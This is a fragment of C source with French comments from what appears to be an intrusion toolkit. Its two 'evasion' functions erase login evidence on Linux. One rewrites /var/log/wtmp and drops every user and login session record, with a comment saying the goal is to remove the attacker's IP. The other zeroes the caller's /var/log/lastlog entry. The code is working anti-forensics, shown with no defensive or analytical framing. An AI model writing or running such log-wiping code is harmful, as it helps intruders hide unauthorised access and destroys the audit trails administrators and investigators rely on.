static void evasion_clear_utmp(void) {
    HEAD; printf("Nettoyage wtmp (/var/log/wtmp)...\n");
    /* Réécriture sans notre IP */
    struct utmp ut;
    char tmppath[] = "/tmp/.wtmp_tmp";
    FILE *src = fopen("/var/log/wtmp", "r");
    FILE *dst = fopen(tmppath, "w");

    if (!src || !dst) {
        WARN; printf("Accès wtmp refusé (besoin root)\n");
        if (src) fclose(src);
        if (dst) fclose(dst);
        return;
    }
    int removed = 0;
    while (fread(&ut, sizeof ut, 1, src) == 1) {
        /* On supprime les entrées de type LOGIN_PROCESS et USER_PROCESS
           correspondant à notre session (simplification: tout supprimer) */
        if (ut.ut_type == USER_PROCESS || ut.ut_type == LOGIN_PROCESS) {
            removed++;
            continue;
        }
        fwrite(&ut, sizeof ut, 1, dst);
    }
    fclose(src); fclose(dst);
    rename(tmppath, "/var/log/wtmp");
    OK; printf("  Supprimé %d entrées de session dans wtmp\n", removed);
}

static void evasion_clear_lastlog(void) {
    HEAD; printf("Nettoyage lastlog...\n");
    uid_t uid = getuid();
    int fd = open("/var/log/lastlog", O_WRONLY);
    if (fd < 0) {
        WARN; printf("Accès lastlog refusé (besoin root)\n");
        return;
    }
    struct lastlog ll;
    memset(&ll, 0, sizeof ll);
    off_t off = (off_t)uid * sizeof ll;
    if (lseek(fd, off, SEEK_SET) >= 0) {
        write(fd, &ll, sizeof ll);
        OK; printf("  Entrée lastlog effacée pour UID %d\n", uid);
    }
    close(fd);
}

